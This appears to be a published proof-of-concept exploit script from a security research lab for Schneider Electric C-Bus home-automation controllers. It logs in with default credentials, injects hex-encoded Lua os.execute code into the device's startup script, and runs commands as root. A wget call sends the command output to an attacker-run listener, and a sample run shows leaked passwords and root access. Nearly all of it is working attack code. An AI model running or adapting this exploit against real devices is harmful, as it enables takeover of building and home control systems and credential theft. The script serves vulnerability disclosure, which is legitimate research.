#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
#
# Schneider Electric C-Bus Automation Controller (5500SHAC) 1.10 Remote Root Exploit
#
#
# Vendor: Schneider Electric SE
# Product web page: https://www.se.com | https://www.clipsal.com
# Product details:
# - https://www.clipsal.com/Trade/Products/ProductDetail?catno=5500SHAC
# - https://www.se.com/ww/en/product/5500AC2/application-controller-spacelogic-cbus-rs232-485-ethernet-din-mount-24v-dc/
# Affected version: CLIPSAL 5500SHAC (i.MX28)
#                   CLIPSAL 5500NAC (i.MX28)
#                   SW: 1.10.0, 1.6.0
#                   HW: 1.0
#                   Potentially vulnerable (alternative products/same codebase?): 5500NAC2 and 5500AC2
#                   SpaceLogic C-Bus
#
# Summary: The C-Bus Network Automation Controller (5500NAC) and the Wiser
# for C-Bus Automation Controller (5500SHAC)) is an advanced controller from
# Schneider Electric. It is specifically designed to unite the C-Bus home
# automation solution with common household communication protocols, from
# lighting and climate control, to security, entertainment and energy metering.
# The Wiser for C-Bus Automation Controller manages and controls C-Bus systems
# for residential homes or zones within a building and integrates functions
# such as heating/cooling, energy/load monitoring and remote control for C-Bus
# and Modbus.
#
# Desc: The automation controller suffers from an authenticated arbitrary
# command execution vulnerability. An attacker can abuse the Start-up (init)
# script editor and exploit the 'script' POST parameter to insert malicious
# Lua script code and execute commands with root privileges that will grant
# full control of the device.
#
# ------------------------------------------------------------------------------
# $ ./c-bus.py http://192.168.0.10 "cat /etc/config/httpd;id" 192.168.0.37 8888
# ----------------------------------------------------------------------
# Starting Z-Bus 2.5.1 ( https://zeroscience.mk ) at 15.03.2022 11:26:38
# [*] Starting exfiltration handler on port 8888
# [*] Writing Lua initscript... done.
# [*] Running os.execute()... done.
# [*] Got request from 192.168.0.10:33522
# [*] Printing target's request:
#
# b"GET / HTTP/1.1\r\nHost: 192.168.0.37:8888\r\nUser-Agent: \nconfig user
# 'admin'\n\toption password 'admin123'\n\nconfig user 'remote'\n\toption
# password 'remote'\n\nuid=0(root) gid=0(root) groups=0(root)\r\nConnection:
# close\r\n\r\n"
#
# [*] Cleaning up... done.
#
# $ 
# ------------------------------------------------------------------------------
#
# Tested on: CPU model: ARM926EJ-S rev 5 (v5l)
#            GNU/Linux 4.4.115 (armv5tejl)
#            LuaJIT 2.0.5
#            FlashSYS v2
#            nginx
#
#
# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
# Macedonian Information Security Research and Development Laboratory
# Zero Science Lab - https://www.zeroscience.mk - @zeroscience
#
#
# Advisory ID: ZSL-2022-5707
# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2022-5707.php
#
#
# 12.03.2022
#

import threading#!
import datetime##!
import requests##!
import socket####!
import time######!
import sys#######!
import re########!

from requests.auth import HTTPBasicAuth
from time import sleep as spikaj

class Wiser:

    def __init__(self):
        self.headers = None
        self.uri = '/scada-main/scripting/'
        self.savs = self.uri + 'save'
        self.runs = self.uri + 'run'
        self.start = datetime.datetime.now()
        self.start = self.start.strftime('%d.%m.%Y %H:%M:%S')
        self.creds = HTTPBasicAuth('admin', 'admin123')

    def memo(self):
        if len(sys.argv) != 5:
            self.use()
        else:
            self.target = sys.argv[1]
            self.execmd = sys.argv[2]
            self.localh = sys.argv[3]
            self.localp = int(sys.argv[4])
            if not 'http' in self.target:
                self.target = 'http://{}'.format(self.target)

    def exfil(self):
        print('[*] Starting exfiltration handler on port {}'.format(self.localp))
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(('0.0.0.0', self.localp))
        while True:
            try:
                s.settimeout(9)
                s.listen(1)
                conn, addr = s.accept()
                print('[*] Got request from {}:{}'.format(addr[0], addr[1]))
                data = conn.recv(2003)
                print('[*] Printing target\'s request:')
                print('\n%s' %data)
            except socket.timeout as p:
                print('[!] Something\'s not right. Check your port mappings!')
            break
        s.close()
        self.clean()

    def mtask(self):
        konac = threading.Thread(name='thricer.exe', target=self.exfil)
        konac.start()
        self.byts()

    def byts(self):
        self.headers = {
            'Referer':self.target+'/scada-main/main/editor?id=initscript',
            'Sec-Ch-Ua':'"(Not(A:Brand";v="8", "Chromium";v="98"',
            'Cookie':'x-logout=0; x-auth=; x-login=1; pin=',
            'Content-Type':'text/plain;charset=UTF-8',
            'User-Agent':'SweetHomeAlabama/2003.59',
            'X-Requested-With':'XMLHttpRequest',
            'Accept-Language':'en-US,en;q=0.9',
            'Accept-Encoding':'gzip, deflate',
            'Sec-Ch-Ua-Platform':'"Windows"',
            'Sec-Fetch-Site':'same-origin',
            'Connection':'keep-alive',
            'Sec-Fetch-Dest':'empty',
            'Sec-Ch-Ua-Mobile':'?0',
            'Sec-Fetch-Mode':'cors',
            'Origin':self.target,
            'Accept':'*/*',
            'sec-gpc':'1'
            }
    
        self.loada  = '\x64\x61\x74\x61\x3D\x7B'                                                                     # data={
        self.loada += '\x22\x65\x78\x74\x2D\x63\x6F\x6D\x70\x2D\x31\x30\x30\x34\x22\x3A\x22\x22\x2C'                 # "ext-comp-1004":"",
        self.loada += '\x22\x65\x78\x74\x2D\x63\x6F\x6D\x70\x2D\x31\x30\x30\x35\x22\x3A\x22\x22\x2C'                 # "ext-comp-1005":"",
        self.loada += '\x22\x65\x78\x74\x2D\x63\x6F\x6D\x70\x2D\x31\x30\x30\x36\x22\x3A\x22\x22\x2C'                 # "ext-comp-1006":"",
        self.loada += '\x22\x65\x78\x74\x2D\x63\x6F\x6D\x70\x2D\x31\x30\x30\x37\x22\x3A\x22\x22\x2C'                 # "ext-comp-1007":"",
        self.loada += '\x22\x65\x78\x74\x2D\x63\x6F\x6D\x70\x2D\x31\x30\x30\x38\x22\x3A\x22\x22\x2C'                 # "ext-comp-1008":"",
        self.loada += '\x22\x73\x63\x61\x64\x61\x2D\x68\x65\x6C\x70\x2D\x73\x65\x61\x72\x63\x68\x22\x3A\x22\x22\x2C' # "scada-help-search":"",
        self.loada += '\x22\x69\x64\x22\x3A\x22\x69\x6E\x69\x74\x73\x63\x72\x69\x70\x74\x22\x2C'                     # "id":"initscript",
        self.loada += '\x22\x73\x63\x72\x69\x70\x74\x22\x3A\x6E\x75\x6C\x6C\x2C'                                     # "script":null,
        self.loada += '\x22\x73\x63\x72\x69\x70\x74\x6F\x6E\x6C\x79\x22\x3A\x22\x74\x72\x75\x65\x22\x7D'             # "scriptonly":"true"}
        self.loada += '\x26\x73\x63\x72\x69\x70\x74\x3D\x6F\x73\x2E\x65\x78\x65\x63\x75\x74\x65'                     # &script=os.execute
        self.loada += '\x28\x27\x77\x67\x65\x74\x20\x2D\x55\x20\x22\x60'                                             # ('wget -U "`
        self.loada += self.execmd                                                                                    # [command input]
        self.loada += '\x60\x22\x20'                                                                                 # `".
        self.loada += self.localh+':'+str(self.localp)                                                               # [listener input]
        self.loada += '\x27\x29'                                                                                     # ')
        self.loadb  = '\x64\x61\x74\x61\x3D\x7B'                                                                     # data={
        self.loadb += '\x22\x69\x64\x22\x3A\x22\x69\x6E\x69\x74\x73\x63\x72\x69\x70\x74\x22\x7D'                     # "id":"initscript"}
        
        print('[*] Writing Lua initscript... ', end='')
        sys.stdout.flush()
        spikaj(0.7)

        htreq = requests.post(self.target+self.savs, data=self.loada, headers=self.headers, auth=self.creds)
        if not 'success' in htreq.text:
            print('didn\'t work!')
            exit(17)
        else:
            print('done.')
        
        print('[*] Running os.execute()... ', end='')
        sys.stdout.flush()
        spikaj(0.7)

        htreq = requests.post(self.target+self.runs, data=self.loadb, headers=self.headers, auth=self.creds)
        if not 'success' in htreq.text:
            print('didn\'t work!')
            exit(19)
        else:
            print('done.')

    def splash(self):
        Baah_loon = '''
     ######
   ##########
  ######    _\_
  ##===----[.].]
  #(     ,   _\\
   #      )\__|
    \        /
     `-._``-'
        >@
         |
         |
         |
         |
         |  Schneider Electric C-Bus SmartHome Automation Controller
         |        Root Remote Code Execution Proof of Concept
         |                       ZSL-2022-5707
         |
         |
         |
        '''
        print(Baah_loon)

    def use(self):
        self.splash()
        print('Usage: ./c-bus.py [target] [cmd] [lhost] [lport]')
        exit(0)

    def clean(self):
        print('\n[*] Cleaning up... ', end='')
        sys.stdout.flush()
        spikaj(0.7)

        self.headers = {'X-Requested-With':'XMLHttpRequest'}

        self.blank  = '\x64\x61\x74\x61\x3D\x25\x37\x42\x25\x32\x32'
        self.blank += '\x65\x78\x74\x2D\x63\x6F\x6D\x70\x2D\x31\x30'
        self.blank += '\x30\x34\x25\x32\x32\x25\x33\x41\x25\x32\x32'
        self.blank += '\x25\x32\x32\x25\x32\x43\x25\x32\x32\x65\x78'

        self.dlank  = '\x74\x2D\x63\x6F\x6D\x70\x2D\x31\x30\x30\x35'
        self.dlank += '\x25\x32\x32\x25\x33\x41\x25\x32\x32\x25\x32'
        self.dlank += '\x32\x25\x32\x43\x25\x32\x32\x65\x78\x74\x2D'
        self.dlank += '\x63\x6F\x6D\x70\x2D\x31\x30\x30\x36\x25\x32'

        self.clank  = '\x32\x25\x33\x41\x25\x32\x32\x25\x32\x32\x25'
        self.clank += '\x32\x43\x25\x32\x32\x65\x78\x74\x2D\x63\x6F'
        self.clank += '\x6D\x70\x2D\x31\x30\x30\x37\x25\x32\x32\x25'
        self.clank += '\x33\x41\x25\x32\x32\x25\x32\x32\x25\x32\x43'

        self.slank  = '\x25\x32\x32\x65\x78\x74\x2D\x63\x6F\x6D\x70'
        self.slank += '\x2D\x31\x30\x30\x38\x25\x32\x32\x25\x33\x41'
        self.slank += '\x25\x32\x32\x25\x32\x32\x25\x32\x43\x25\x32'
        self.slank += '\x32\x73\x63\x61\x64\x61\x2D\x68\x65\x6C\x70'

        self.glank  = '\x2D\x73\x65\x61\x72\x63\x68\x25\x32\x32\x25'
        self.glank += '\x33\x41\x25\x32\x32\x25\x32\x32\x25\x32\x43'
        self.glank += '\x25\x32\x32\x69\x64\x25\x32\x32\x25\x33\x41'
        self.glank += '\x25\x32\x32\x69\x6E\x69\x74\x73\x63\x72\x69'

        self.hlank  = '\x70\x74\x25\x32\x32\x25\x32\x43\x25\x32\x32'
        self.hlank += '\x73\x63\x72\x69\x70\x74\x25\x32\x32\x25\x33'
        self.hlank += '\x41\x25\x32\x32\x25\x32\x32\x25\x32\x43\x25'
        self.hlank += '\x32\x32\x73\x63\x72\x69\x70\x74\x6F\x6E\x6C'

        self.flank  = '\x79\x25\x32\x32\x25\x33\x41\x25\x32\x32\x74'
        self.flank += '\x72\x75\x65\x25\x32\x32\x25\x37\x44'#######'

        self.clear = f'{self.blank}{self.dlank}{self.clank}{self.slank}{self.glank}{self.hlank}{self.flank}'
        htreq = requests.post(self.target+self.savs, data=self.clear, headers=self.headers, auth=self.creds)
        if not 'success' in htreq.text:
            print('didn\'t work!')
            exit(18)
        else:
            print('done.')
            exit(-1)

    def main(self):
        print('-'*70)
        print('Starting Z-Bus 2.5.1 ( https://zeroscience.mk ) at', self.start)
        self.memo(), self.mtask()

if __name__ == '__main__':
    Wiser().main()
